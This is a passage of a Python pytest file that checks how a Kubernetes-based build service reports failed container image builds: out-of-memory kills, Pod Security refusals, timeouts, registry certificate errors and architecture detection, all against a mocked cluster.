        get_settings.cache_clear()



def test_a_build_out_of_memory_says_which_setting_to_raise(app, session, cluster):
    boss = _login(app, session, "boss@x.local", is_superuser=True)
    _create(boss, language="r", language_version="4.5", packages="forecast")
    _round(session)
    cluster.finish("tabularia-build-e1-v1", False,
                   "#11 478.5 g++: fatal error: Killed signal terminated program cc1plus\n"
                   "#11 517.3 Error: not installed: arrow, forecast\n")
    _round(session)
    v = session.exec(select(ScriptEnvironmentVersion)).one()
    assert v.status == "failed" and "ran out of memory" in v.error and "SCRIPTS__BUILD_MEMORY (now 4Gi)" in v.error
    assert "Killed signal" in v.build_log


def test_a_build_pod_the_cluster_refuses_fails_at_once_saying_why(app, session, cluster, monkeypatch):
    # the build namespace at Pod Security baseline (createNamespaces: false), a quota, a
    # LimitRange: the version stayed «building» an hour, then failed saying nothing of it
    boss = _login(app, session, "boss@x.local", is_superuser=True)
    _create(boss)
    _round(session)  # queued → building
    cluster.job("tabularia-build-e1-v1")["metadata"]["creationTimestamp"] = "2026-10-20T10:00:00Z"
    real = cluster.handle

    def refusing(req):
        if req.url.path.endswith("/pods"):
            return httpx.Response(200, json={"items": []})  # the Job controller could create none
        if req.url.path.endswith("/events"):
            return httpx.Response(200, json={"items": [{"reason": "FailedCreate", "message":
                'Error creating: pods "tabularia-build-e1-v1-x" is forbidden: violates PodSecurity "baseline:latest": '
                'seccompProfile (container "build" must not set securityContext.seccompProfile.type to "Unconfined")'}]})
        return real(req)

    monkeypatch.setattr(kube_jobs, "_transport", httpx.MockTransport(refusing))
    _round(session)
    v = session.exec(select(ScriptEnvironmentVersion)).one()
    assert v.status == "failed" and "The build cannot start: the cluster refused to create its Pod" in v.error
    assert "PodSecurity" in v.error and not cluster.jobs


def test_a_build_the_kernel_killed_whole_is_out_of_memory(app, session, cluster, monkeypatch):
    # cgroup v2: the kernel kills the whole container, the compiler never prints «Killed signal»
    boss = _login(app, session, "boss@x.local", is_superuser=True)
    _create(boss, language="r", language_version="4.5", packages="forecast")
    _round(session)
    cluster.finish("tabularia-build-e1-v1", False, "#11 478.5 installing *source* package 'arrow' ...\n")
    real = cluster.handle

    def killed(req):
        r = real(req)
        if req.url.path.endswith("/pods"):
            body = r.json()
            body["items"][0]["status"] = {"containerStatuses": [{"state": {"terminated": {"exitCode": 137,
                                                                                          "reason": "Error"}}}]}
            return httpx.Response(200, json=body)
        return r

    monkeypatch.setattr(kube_jobs, "_transport", httpx.MockTransport(killed))
    _round(session)
    v = session.exec(select(ScriptEnvironmentVersion)).one()
    assert v.status == "failed" and "ran out of memory" in v.error and "SCRIPTS__BUILD_MEMORY" in v.error


def test_a_build_past_its_deadline_names_the_setting(app, session, cluster):
    boss = _login(app, session, "boss@x.local", is_superuser=True)
    _create(boss)
    _round(session)
    cluster.finish("tabularia-build-e1-v1", False, "", reason="DeadlineExceeded")
    _round(session)
    v = session.exec(select(ScriptEnvironmentVersion)).one()
    assert v.status == "failed" and "SCRIPTS__BUILD_TIMEOUT_SECONDS (3600 s)" in v.error


def test_an_image_the_nodes_cannot_download_fails_the_build_at_once(app, session, cluster, monkeypatch):
    monkeypatch.setattr(script_builds, "PULL_FAILURE_SECONDS", 0)
    boss = _login(app, session, "boss@x.local", is_superuser=True)
    _create(boss)
    _round(session)
    cluster.finish("tabularia-build-e1-v1", True, f"{script_builds.DIGEST_MARK}{DIGEST}")
    _round(session)  # → checking: the new image is pulled by a node
    cluster.waiting["tabularia-check-e1-v1"] = {
        "reason": "ErrImagePull",
        "message": "failed to resolve reference: tls: failed to verify certificate: x509: certificate signed by unknown authority"}
    _round(session)
    v = session.exec(select(ScriptEnvironmentVersion)).one()
    assert v.status == "failed" and "check of the new image cannot start" in v.error
    assert "nodes do not trust the registry's certificate" in v.error
    assert ("tab-scripts", "tabularia-check-e1-v1") not in cluster.jobs


def test_a_push_the_registry_refuses_says_why(app, session, cluster):
    boss = _login(app, session, "boss@x.local", is_superuser=True)
    _create(boss)
    _round(session)
    cluster.finish("tabularia-build-e1-v1", False, "#10 ERROR: failed to push registry.example.com/tabularia/tabularia-env-1:v1: "
                   "tls: failed to verify certificate: x509: certificate signed by unknown authority")
    _round(session)
    v = session.exec(select(ScriptEnvironmentVersion)).one()
    assert v.status == "failed" and "not pushed" in v.error and "scripts.registry.caCert" in v.error


def test_the_build_trusts_the_company_authority(cluster, monkeypatch):
    monkeypatch.setenv("SCRIPTS__REGISTRY", "registry.acme.internal:5000/envs")
    monkeypatch.setenv("SCRIPTS__REGISTRY_CA_CONFIGMAP", "tab-registry-ca")
    get_settings.cache_clear()
    v = ScriptEnvironmentVersion(id=1, environment_id=1, number=1, language_version="3.12",
                                 base_image="python:3.12-slim", packages="")
    pod = script_builds.build_job(v, "python")["spec"]["template"]["spec"]
    script = pod["containers"][0]["command"][2]
    # BuildKit verifies that registry with the company's authority, mounted from the ConfigMap
    assert "registry.acme.internal:5000" in script and script_builds.CA_PATH in script and "--config" in script
    assert {"name": "registry-ca", "configMap": {"name": "tab-registry-ca"}} in pod["volumes"]
    get_settings.cache_clear()


@pytest.mark.parametrize("uname, arch", [("aarch64", "arm64"), ("x86_64", "amd64"), ("mips", None)])
def test_a_build_keeps_the_architecture_it_was_built_for(app, session, cluster, uname, arch):
    boss = _login(app, session, "boss@x.local", is_superuser=True)
    _create(boss)
    _round(session)
    assert "uname -m" in cluster.job("tabularia-build-e1-v1")["spec"]["template"]["spec"]["containers"][0]["command"][2]
    cluster.finish("tabularia-build-e1-v1", True,
                   f"#10 DONE\n{script_builds.DIGEST_MARK}{DIGEST}\n{script_builds.ARCH_MARK}{uname}\n")
    _round(session)
    v = session.exec(select(ScriptEnvironmentVersion)).one()
    assert v.status == "checking" and v.arch == arch and script_builds.ARCH_MARK not in v.build_log
    pod = cluster.job("tabularia-check-e1-v1")["spec"]["template"]["spec"]
    # the check pulls and runs the image where the scripts will
    assert pod.get("nodeSelector") == ({"kubernetes.io/arch": arch} if arch else None)
